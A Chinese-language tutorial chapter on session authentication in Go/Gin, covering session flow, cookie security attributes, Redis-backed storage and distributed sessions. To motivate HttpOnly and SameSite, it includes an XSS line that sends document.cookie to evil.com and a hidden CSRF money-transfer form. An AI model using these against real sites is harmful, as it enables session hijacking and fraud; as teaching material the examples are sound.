# 第78章 · Session认证

> "你进了一次写字楼，每次上楼都要重新跟保安登记？太蠢了。保安会给你一张临时门禁卡——刷一下，就知道你是访客、有效期到几点、能去几楼。Session就是这个思路：登录成功以后，服务器发给你一个SessionID，存在Cookie里。之后每次请求带上这个ID，服务器一查就知道'哦，是张三，他的登录还没过期'。"

---

## 78.1 Session的工作流程

### 为什么需要Session？

HTTP是无状态协议。你第一次请求说"我是张三"，第二次请求服务器就忘了——它不记得上一秒发生过什么。

就好比一条金鱼，你跟它说话，它听完一秒就忘了。每次它都说"你好，你是谁？"

Session（服务器端存储的用户状态数据，详见附录I）就是给这条"金鱼"配一个档案柜——每个访客发一个编号，编号对应档案柜里的一张卡片。下次金鱼看到编号，就去翻卡片："哦，你是张三，十分钟前来过，还没走。"

### 完整流程（六个步骤）

```
┌─────┐                         ┌──────────┐
│浏览器│                         │  服务器   │
└──┬──┘                         └────┬─────┘
   │                                  │
   │  1. POST /login {user,pwd}      │
   │─────────────────────────────────>│
   │                                  │ 2. 验证用户名密码
   │                                  │ 3. 生成SessionID: "abc123"
   │                                  │ 4. 在内存/Redis里存 Session{ID,UserID,过期时间}
   │  5. Set-Cookie: session_id=abc123│
   │<─────────────────────────────────│
   │                                  │
   │  6. GET /api/profile             │
   │  Cookie: session_id=abc123       │
   │─────────────────────────────────>│
   │                                  │ 7. 根据abc123查Session → 找到UserID=42
   │                                  │ 8. 查数据库获取用户信息
   │  9. 200 OK {name,email...}       │
   │<─────────────────────────────────│
```

**各步骤详解：**

1. **登录请求**：用户输入用户名密码，发POST到 `/login`
2. **验证密码**：服务器用bcrypt验证密码是否正确
3. **生成SessionID**：生成一个全球唯一的随机字符串，比如 `"sess_a7f3c9b2e1d4"`
4. **存储Session**：服务器在自己的存储里记录：`SessionID → {userID: 42, username: "张三", loginTime: ..., expireAt: ...}`
5. **下发Cookie**：通过HTTP响应头 `Set-Cookie` 把SessionID发给浏览器
6. **后续请求自动带Cookie**：浏览器根据域名自动把Cookie附加到每个请求里
7. **服务器查Session**：从请求的Cookie里取出SessionID，去存储里查对应的用户信息
8. **返回数据**：如果Session有效且未过期，正常处理请求并返回数据

### Session的本质

Session是一段在**服务器端**存储的数据。Cookie里只放了一个**钥匙**（SessionID），真正的数据都在服务器手里。

这跟你去游泳馆一样：你拿到的只是一个手牌号（SessionID），衣服、包、手机都锁在柜子里（服务器存储）。你不可能自己打开柜子——只能凭手牌号让管理员帮你开。

### 一个极简的Go实现

```go
package main

import (
	"crypto/rand"
	"encoding/hex"
	"net/http"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

type Session struct {
	UserID   int64
	Username string
	ExpireAt time.Time
}

var sessionStore = struct {
	sync.RWMutex
	data map[string]*Session
}{data: make(map[string]*Session)}

func generateSessionID() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func Login(c *gin.Context) {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	c.ShouldBindJSON(&req)

	userID := int64(42)

	sessionID := generateSessionID()
	session := &Session{
		UserID:   userID,
		Username: req.Username,
		ExpireAt: time.Now().Add(24 * time.Hour),
	}

	sessionStore.Lock()
	sessionStore.data[sessionID] = session
	sessionStore.Unlock()

	c.SetCookie("session_id", sessionID, 86400, "/", "", false, true)

	c.JSON(http.StatusOK, gin.H{"msg": "登录成功"})
}

func GetProfile(c *gin.Context) {
	sessionID, err := c.Cookie("session_id")
	if err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"msg": "请先登录"})
		return
	}

	sessionStore.RLock()
	session, exists := sessionStore.data[sessionID]
	sessionStore.RUnlock()

	if !exists || time.Now().After(session.ExpireAt) {
		c.JSON(http.StatusUnauthorized, gin.H{"msg": "登录已过期"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"user_id":  session.UserID,
		"username": session.Username,
	})
}
```

`SetCookie` 的七个参数：
1. `"session_id"` — Cookie名
2. `sessionID` — Cookie值
3. `86400` — 过期时间（秒），86400=24小时
4. `"/"` — 有效路径，`/` 表示全站
5. `""` — 有效域名，空表示当前域名
6. `false` — Secure（仅HTTPS），测试时关掉
7. `true` — HttpOnly（JS不可读）

---

## 78.2 Cookie的安全属性

Cookie就像一个放在浏览器里的便签。九个安全属性决定这个便签谁都能看、还是只有特定条件才能用。

### HttpOnly：禁止JavaScript读取

```go
c.SetCookie("session_id", sessionID, 86400, "/", "", false, true)
//                                                          ^^^^
//                                                    这个true就是HttpOnly
```

HttpOnly=true的Cookie**不能被JavaScript访问**。也就是说：

```javascript
document.cookie  // ❌ 读不到 session_id（如果HttpOnly=true）
```

为什么这是救命的功能？

想象你的网站被XSS攻击（第82章详讲）：攻击者在你的页面注入了恶意JavaScript。如果SessionID可以被JS读取，攻击者一行 `fetch("https://evil.com/steal?cookie=" + document.cookie)` 就把所有用户的SessionID偷走了——然后他可以用这些SessionID冒充任何用户。

HttpOnly让SessionID对JS**完全不可见**。攻击者注入了脚本也偷不到SessionID。

### Secure：仅HTTPS传输

```go
c.SetCookie("session_id", sessionID, 86400, "/", "", true, true)
//                                                   ^^^^
//                                              这个true就是Secure
```

Secure=true的Cookie**只在HTTPS连接中发送**。如果你用HTTP访问，浏览器不会把这个Cookie附在请求里。

场景：你在咖啡馆连了公共WiFi，有个攻击者在同一个网络里抓包。如果你的网站用HTTP，SessionID在网络上明文传输，攻击者抓包就能拿到。Secure强制只用HTTPS——即使被抓包也是加密的，攻击者看不到内容。

**生产环境必须两个都开**：`Secure=true, HttpOnly=true`。

### SameSite：防CSRF的第一道防线

SameSite控制Cookie在**跨站请求**时是否发送。有三个级别：

| SameSite值 | 行为 | 通俗解释 |
|-----------|------|---------|
| `Strict` | 只有**同站**请求才发Cookie | 你在A站点的Cookie绝不会在B站点的请求里发送 |
| `Lax`（默认） | 同站请求+跨站GET导航才发 | 从B站点点了一个链接跳转到A站点，Cookie会发送 |
| `None` | 所有请求都发Cookie | 完全不受限制（必须配合Secure=true） |

假设你登录了 `bank.com`，Cookie的SameSite=Strict。然后你访问了一个恶意网站 `evil.com`，这个网站有一个表单：

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
  <button>点击领取奖品</button>
</form>
```

如果你点了——在Strict模式下，这个POST请求**不会携带** bank.com 的Cookie，所以银行服务器收到的请求里没有你的SessionID，转账失败。CSRF攻击被拦住了。

Lax是大多数现代浏览器的默认值，它在安全性和可用性之间取得了平衡——正常的链接导航仍然能用，但危险的POST/表单提交被阻止。

### Domain 和 Path：Cookie的作用范围

```
Domain=example.com       →  所有 *.example.com 的子域名都能访问
Domain=api.example.com   →  只有 api.example.com 能访问
Path=/app                →  只有 /app/* 路径的请求才带Cookie
Path=/                   →  全站所有路径
```

如果你不设Domain，Cookie默认只在当前域名生效，不包括子域名。

### Expires / Max-Age：Cookie的寿命

```
Expires=Wed, 21 Oct 2026 07:28:00 GMT   →  到那个时间点过期
Max-Age=86400                            →  从现在起86400秒（24小时）后过期
```

如果两者都设了，Max-Age优先。如果都不设，这个Cookie在浏览器关闭时自动删除（称为"会话Cookie"）。

在Gin中，`SetCookie` 的第三个参数就是Max-Age（秒）。

### 🤔 想多一点

很多人问：HttpOnly防了XSS偷Cookie，但万一攻击者直接在页面上发API请求呢？他不用偷Cookie——只要诱导用户在他注入的脚本里发一个 `fetch("/api/transfer", {method:"POST", body:...})`，Cookie自动就带上了。

这是对的！HttpOnly防的是**Cookie被偷走并在其他地方使用**，但它防不了**攻击者在当前页面代表用户发请求**。

这就是为什么我们需要多层防护：
- HttpOnly → 防Cookie被偷
- SameSite → 防跨站请求携带Cookie
- CSRF Token → 防攻击者伪造请求（第82章）
- CSP（内容安全策略）→ 防恶意脚本注入（第82章）

**安全不是靠单一手段，而是靠层层叠加。**

---

## 78.3 Session存储方案

### 方案一：内存存储

就是78.1里用的 `map[string]*Session`。

```
优点：速度最快（零网络延迟）
缺点：服务器重启全部丢失；多台服务器之间无法共享
适用：开发环境、单机小项目
```

**不适合生产环境**。重启一次服务器，所有用户都要重新登录——用户体验极差。

### 方案二：数据库存储

把Session存在MySQL的 `sessions` 表里：

```sql
CREATE TABLE sessions (
    session_id VARCHAR(64) PRIMARY KEY,
    user_id BIGINT NOT NULL,
    data TEXT,
    created_at DATETIME NOT NULL,
    expires_at DATETIME NOT NULL,
    INDEX idx_expires (expires_at)
);
```

```
优点：持久化，重启不丢；多台服务器共用同一个数据库
缺点：每次请求都要查数据库（磁盘IO慢）
适用：Session量不大、对延迟不敏感的场景
```

记得定时清理过期Session：

```sql
DELETE FROM sessions WHERE expires_at < NOW();
```

可以用一个定时任务（cron job），每10分钟跑一次。

### 方案三：Redis存储（推荐）

```
优点：内存级速度 + 持久化 + 自动过期 + 分布式友好
缺点：多了一个要运维的中间件
适用：几乎所有生产环境
```

Redis天生适合存Session：
- **快**：数据在内存里，单次读写不到1毫秒
- **自动过期**：`SET session:abc123 user_data EX 86400` —— 86400秒后自动删除，不需要手动清理
- **分布式共享**：所有服务器连同一个Redis，天然共享Session

Go操作Redis存Session：

```go
import (
	"context"
	"encoding/json"
	"time"

	"github.com/redis/go-redis/v9"
)

var rdb = redis.NewClient(&redis.Options{
	Addr: "localhost:6379",
})

func SaveSession(sessionID string, session *Session) error {
	data, _ := json.Marshal(session)
	ctx := context.Background()
	return rdb.Set(ctx, "session:"+sessionID, data, 24*time.Hour).Err()
}

func GetSession(sessionID string) (*Session, error) {
	ctx := context.Background()
	data, err := rdb.Get(ctx, "session:"+sessionID).Bytes()
	if err != nil {
		return nil, err
	}
	var session Session
	json.Unmarshal(data, &session)
	return &session, nil
}

func DeleteSession(sessionID string) error {
	ctx := context.Background()
	return rdb.Del(ctx, "session:"+sessionID).Err()
}
```

`SET ... EX 86400` 在24小时后自动删除——你完全不需要写过期清理逻辑。Redis内置的expire机制比任何手动清理都高效可靠。

---

## 78.4 分布式Session

### 单台服务器的困境

如果你的API部署了3台服务器，前面加一个Nginx负载均衡：

```
           ┌─────────┐
用户 ────>│  Nginx   │
           └──┬───┬──┘
              │   │
         ┌────┘   └────┐
         ▼             ▼
   ┌──────────┐  ┌──────────┐
   │ 服务器A   │  │ 服务器B   │
   │ Session  │  │ Session  │
   │ 在内存    │  │ 在内存    │
   └──────────┘  └──────────┘
```

问题：用户第一次登录被Nginx分配到服务器A，Session存在服务器A的内存里。下次请求被分配到服务器B——服务器B不认识这个SessionID，因为它的内存里根本没有这条记录。用户被要求重新登录。

这叫**Session粘滞问题**。每台服务器都有自己的"记忆"，它们不互通。

### 方案一：IP哈希（不推荐）

在Nginx里配置 `ip_hash`，让同一个IP的请求永远打到同一台服务器：

```
upstream backend {
    ip_hash;
    server 192.168.1.10:8080;
    server 192.168.1.11:8080;
}
```

问题：如果那台服务器挂了，用户的Session就丢了；如果用户切换了WiFi（IP变了），Session也丢了。这是一种"看起来很聪明但实际很脆弱"的方案。

### 方案二：Redis集中存储（推荐）

所有服务器都把Session存到同一个Redis：

```
           ┌─────────┐
用户 ────>│  Nginx   │
           └──┬───┬──┘
              │   │
         ┌────┘   └────┐
         ▼             ▼
   ┌──────────┐  ┌──────────┐
   │ 服务器A   │  │ 服务器B   │
   │          │  │          │
   └────┬─────┘  └─────┬────┘
        │              │
        └──────┬───────┘
               ▼
         ┌──────────┐
         │  Redis   │
         │ 所有     │
         │ Session  │
         └──────────┘
```

每台服务器不存Session，只负责读写Redis。无论请求被Nginx分配到哪台服务器，都能从同一个Redis里取到Session。

这就是**无状态服务器**：服务器本身不保存任何用户数据，所有状态都外移到Redis。任何一台服务器挂了，换另一台顶上——对用户完全透明。

### 分布式Session要考虑的细节

**1. Redis挂了怎么办？**

Session不能丢——丢了用户全都要重新登录。解决方案：
- Redis主从+哨兵：一台Redis挂了自动切换到备用
- Redis Cluster：多台Redis分散存储，一台挂了不丢全部数据

**2. 网络延迟**

Redis在另一台机器上，每次请求都要网络往返一次。但这个延迟通常不到1毫秒（内网），对用户体验几乎没影响。

**3. 序列化开销**

Session数据要转成JSON才能在Redis里存。通常一个Session就几百字节，JSON编解码的开销可以忽略。

---

## 78.5 Gin Session中间件

手写Session虽然帮我们理解了原理，但生产环境应该用成熟库。`gin-contrib/sessions` 是最常用的选择。

### 安装

```bash
go get github.com/gin-contrib/sessions
go get github.com/gin-contrib/sessions/redis
```

### 基础用法（Cookie存储，适合开发）

```go
package main

import (
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()

	store := cookie.NewStore([]byte("a-very-secret-key-32bytes!!"))
	r.Use(sessions.Sessions("my_session", store))

	r.POST("/login", func(c *gin.Context) {
		session := sessions.Default(c)

		session.Set("user_id", int64(42))
		session.Set("username", "张三")
		session.Save()

		c.JSON(200, gin.H{"msg": "登录成功"})
	})

	r.GET("/profile", func(c *gin.Context) {
		session := sessions.Default(c)
		userID := session.Get("user_id")
		username := session.Get("username")

		if userID == nil {
			c.JSON(401, gin.H{"msg": "请先登录"})
			return
		}

		c.JSON(200, gin.H{
			"user_id":  userID,
			"username": username,
		})
	})

	r.Run(":8080")
}
```

`cookie.NewStore` 把Session数据加密后直接存在Cookie里（不是只存ID）。优点是零依赖，缺点是Cookie有4KB大小限制、每次请求都要传输完整Session数据。

### Redis存储（生产环境）

```go
import (
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/redis"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()

	store, _ := redis.NewStore(10, "tcp", "localhost:6379", "", []byte("secret-key"))
	r.Use(sessions.Sessions("my_session", store))

	r.POST("/login", func(c *gin.Context) {
		session := sessions.Default(c)
		session.Set("user_id", int64(42))
		session.Set("username", "张三")
		session.Save()
		c.JSON(200, gin.H{"msg": "登录成功"})
	})

	r.GET("/logout", func(c *gin.Context) {
		session := sessions.Default(c)
		session.Clear()
		session.Save()
		c.JSON(200, gin.H{"msg": "已退出"})
	})

	r.Run(":8080")
}
```

`redis.NewStore` 的参数：
1. `10` — 最大空闲连接数
2. `"tcp"` — 连接协议
3. `"localhost:6379"` — Redis地址
4. `""` — Redis密码（无密码则为空）
5. `[]byte("secret-key")` — 用于加密Cookie中SessionID的密钥

### Session配置选项

```go
store.Options(sessions.Options{
	Path:     "/",
	Domain:   "",
	MaxAge:   86400,     // 24小时
	Secure:   true,      // 仅HTTPS
	HttpOnly: true,      // JS不可读
	SameSite: http.SameSiteLaxMode,
})
```

这些选项最终会设置到Cookie上。生产环境的安全基线：

```go
store.Options(sessions.Options{
	Path:     "/",
	MaxAge:   86400 * 7, // 7天
	Secure:   true,
	HttpOnly: true,
	SameSite: http.SameSiteStrictMode,
})
```

### 🤔 想多一点

`gin-contrib/sessions` 帮你做了三件事：
1. 自动生成和管理SessionID
2. 通过Cookie自动传递SessionID
3. 提供统一的 `Get/Set/Save/Clear` 接口

但它**不管你存什么**。你可以存 `user_id`、`username`、`role`，也可以存 `shopping_cart`、`last_visited_page`。但别把大对象塞进去——Session是每次请求都要读取的，塞太多数据会影响性能。保持Session轻量：只存身份标识（如userID），需要详细信息时再去数据库查。

---

## 本章小结

| 知识点 | 要点 |
|--------|------|
| Session是什么 | 服务器端存储的用户状态数据 |
| SessionID | 随机字符串，Cookie传递，服务器根据它查找用户 |
| 完整流程 | 登录→存Session→发Cookie→请求带Cookie→查Session→返回 |
| HttpOnly | Cookie不能被JS读取，防XSS偷SessionID |
| Secure | Cookie仅HTTPS传输，防中间人抓包 |
| SameSite | Strict/Lax/None，防CSRF |
| 内存存储 | 快但单机，重启丢失 |
| 数据库存储 | 持久化但慢，需要手动清理 |
| Redis存储 | 快+自动过期+分布式，生产首选 |
| 分布式Session | 集中Redis，所有服务器共享 |
| gin-contrib/sessions | 成熟中间件，支持Cookie/Redis/Memcached多种后端 |
| 生产安全基线 | Secure+HttpOnly+SameSite Strict |

> 🚀 下一章：第79章 · JWT认证。Session虽然好用，但它依赖服务器端存储。如果你的系统有几十台服务器、每天几千万请求，每次都查Redis也是一笔开销。有没有一种方案，用户自己带着"身份证明"，服务器看一眼就能验证真伪、不需要查任何存储？这就是JWT——一种自包含的、可验证的Token。它就像一张签名防伪的门票。

---
[← 上一章：77-认证基础](77-认证基础/) | [下一章：79-JWT认证 →](79-JWT认证/)
